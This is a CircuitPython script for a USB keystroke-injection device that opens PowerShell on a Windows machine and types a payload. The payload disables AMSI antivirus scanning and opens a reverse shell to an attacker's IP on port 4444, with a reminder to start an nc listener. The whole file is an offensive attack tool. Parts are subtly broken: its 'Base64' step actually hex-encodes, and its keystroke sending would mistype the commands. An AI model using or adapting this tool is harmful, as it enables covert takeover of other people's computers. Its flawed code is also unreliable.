import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
# REMINDER START LISTENER WITH nc -nvlp 4444
keyboard = Keyboard(usb_hid.devices)

time.sleep(3)  # Delay before execution

# Open PowerShell
keyboard.send(Keycode.WINDOWS, Keycode.R)
time.sleep(0.5)
keyboard.send(Keycode.P, Keycode.O, Keycode.W, Keycode.E, Keycode.R, Keycode.S, Keycode.H, Keycode.E, Keycode.L, Keycode.L)
time.sleep(0.5)
keyboard.send(Keycode.ENTER)
time.sleep(1)

# Obfuscated PowerShell reverse shell payload
#AMSI bypass
#ADD YOUR IP 
obfuscated_payload = '''
$A=[Ref].Assembly.GetType(('System.M'+'anag'+'ement.Aut'+'omation.AMS'+'IUt'+'ils'))
$B=$A.GetField(('ams'+'iInit'+'Failed'),'NonP'+'ublic,Static')
$B.SetValue($null,$true)

$X=New-Object System.Net.Sockets.TCPClient("YOUR-IP-HERE",4444);
$S=$X.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0)
{$D=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($B,0,$I);
$R=(iex $D 2>&1 | Out-String );$R2=$R + "PS " + (pwd).Path + "> ";
$SB=([text.encoding]::ASCII).GetBytes($R2);$S.Write($SB,0,$SB.Length);$S.Flush()};$X.Close()'''

# Convert to Base64
payload_bytes = obfuscated_payload.encode('utf-16le')
payload_b64 = ''.join('{:02x}'.format(x) for x in payload_bytes)

# Send PowerShell command
command = f'powershell -e {payload_b64}'
for char in command:
    keyboard.send(getattr(Keycode, char.upper(), Keycode.SPACE))
    time.sleep(0.02)

keyboard.send(Keycode.ENTER)  # Execute payload
